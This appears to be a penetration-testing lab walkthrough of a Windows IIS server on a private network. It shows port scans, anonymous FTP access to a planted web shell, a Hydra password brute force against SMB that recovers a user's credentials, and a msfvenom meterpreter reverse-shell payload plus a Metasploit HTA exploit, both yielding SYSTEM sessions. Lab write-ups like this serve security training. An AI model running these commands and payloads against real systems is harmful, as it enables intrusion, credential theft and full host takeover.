## IP: `192.168.100.51`
## OS: Windows

```bash
┌──(rootkali)-[~]
└─# ping -c 3 target2.local 
PING target2.local (192.168.100.51) 56(84) bytes of data.
64 bytes from target2.local (192.168.100.51): icmp_seq=1 ttl=128 time=0.731 ms
64 bytes from target2.local (192.168.100.51): icmp_seq=2 ttl=128 time=0.519 ms
64 bytes from target2.local (192.168.100.51): icmp_seq=3 ttl=128 time=0.534 ms

--- target2.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2027ms
rtt min/avg/max/mdev = 0.519/0.594/0.731/0.096 ms

```

Target is **up** and it is a Windows target

```bash
┌──(rootkali)-[~]
└─# nmap -sV -p- -T4 target2.local -oN Target_2/nmap-service-detection-full-port.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-08 16:27 IST
Nmap scan report for target2.local (192.168.100.51)
Host is up (0.00063s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49174/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:58:1F:43:AC:B9 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.44 seconds

```

## Port 21 (FTP)

Let's check anonymous login.

```bash
┌──(rootkali)-[~]
└─# ftp target2.local
Connected to target2.local.
220 Microsoft FTP Service
Name (target2.local:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> sl
?Invalid command
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-19-22  02:25AM       <DIR>          aspnet_client
04-19-22  01:19AM                 1400 cmdasp.aspx
04-19-22  12:17AM                99710 iis-85.png
04-19-22  12:17AM                  701 iisstart.htm
04-19-22  02:13AM                   22 robots.txt.txt
226 Transfer complete.
ftp> 

```


## Port 80 (IIS)

- Default IIS Page
![[Pasted image 20250908164541.png]]
- The files from ftp suggested that there is a command shell uploaded on the server

![[Pasted image 20250908170041.png]]

The Administrator flag.

![[Pasted image 20250908170736.png]]
Finally, got the hidden user steven.

![[Pasted image 20250908171025.png]]

## Webdav test

```bash
root@kali:~# nmap -p 80 target2.local --script http-webdav-scan
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-09 03:01 IST
Nmap scan report for target2.local (192.168.100.51)
Host is up (0.00023s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Date: Mon, 08 Sep 2025 21:31:25 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/8.5
|   Directory Listing: 
|     http://target2.local/
|     http://target2.local/aspnet_client/
|     http://target2.local/cmdasp.aspx
|     http://target2.local/iis-85.png
|     http://target2.local/iisstart.htm
|_    http://target2.local/robots.txt.txt
MAC Address: 02:58:1F:43:AC:B9 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds

```
## Port 445 (SMB)

Let's check anonymous login.

```bash
──(rootkali)-[~]
└─# smbclient -L target2.local                                                                                                                                                           1 ⨯
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_ACCESS_DENIED

```

Doesn't work we need to enumerate users.

```bash
┌──(rootkali)-[~]
└─# hydra -l steven -P rockyou.txt target2.local smb -t 10 -I
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 17:10:57
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://target2.local:445/
[445][smb] host: target2.local   login: steven   password: bonita
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 17:11:02

```

- Found Creds: `steven` and password is `bonita`

```bash
┌──(rootkali)-[~/Internal_Targets]
└─# smbclient -L //192.168.100.51/ -U steven                                                                                                                                             1 ⨯
Enter WORKGROUP\steven's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        print$          Disk      Printer Drivers
        wwwroot         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.100.51 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                             
┌──(rootkali)-[~/Internal_Targets]
└─# smbclient //192.168.100.51/wwwroot -U steven
Enter WORKGROUP\steven's password: 
Try "help" to get a list of possible commands.
smb: \> 

```



### Enumerating SMB

```bash
──(rootkali)-[~/Target_2]
└─# smbclient //target2.local/wwwroot -U steven  
Enter WORKGROUP\steven's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep  8 17:15:59 2025
  ..                                  D        0  Mon Sep  8 17:15:59 2025
  aspnet_client                       D        0  Tue Apr 19 07:55:42 2022
  cmdasp.aspx                         A     1400  Tue Apr 19 06:49:47 2022
  iis-85.png                          A    99710  Tue Apr 19 05:47:51 2022
  iisstart.htm                        A      701  Tue Apr 19 05:47:51 2022
  robots.txt.txt                      A       22  Tue Apr 19 07:43:54 2022

                7774207 blocks of size 4096. 1452822 blocks available
smb: \> 

```

The same files we found on FTP.

## Port 3389 (RDP)

No success.

We need to get a persistence access to this machine.

Let's generate a msfvenom payload and upload via FTP.

```bash
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=1235 -f exe -o shell_target2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell_target2.exe
root@kali:~# 

```

```bash
 run

[*] Started reverse TCP handler on 192.168.100.5:1235 

[*] Sending stage (175174 bytes) to 192.168.100.51
[*] Meterpreter session 1 opened (192.168.100.5:1235 -> 192.168.100.51:53146 ) at 2025-09-09 01:44:32 +0530

meterpreter > 
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 


```

## Another Way Of Getting Elevated Shell

```bash
msf6 exploit(windows/misc/hta_server) > [*] Using URL: http://0.0.0.0:8080/POh9Nn.hta
[*] Local IP: http://192.168.100.5:8080/POh9Nn.hta
[*] Server started.
[*] 192.168.100.51   hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 192.168.100.51
[*] Meterpreter session 1 opened (192.168.100.5:9001 -> 192.168.100.51:52886 ) at 2025-09-14 02:46:19 +0530

msf6 exploit(windows/misc/hta_server) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                         Connection
  --  ----  ----                     -----------                         ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WINSERVER-02  192.168.100.5:9001 -> 192.168.100.51:52886  (192.168.100.51)

msf6 exploit(windows/misc/hta_server) > sessions 1
[*] Starting interaction with 1...

meterpreter > 
```

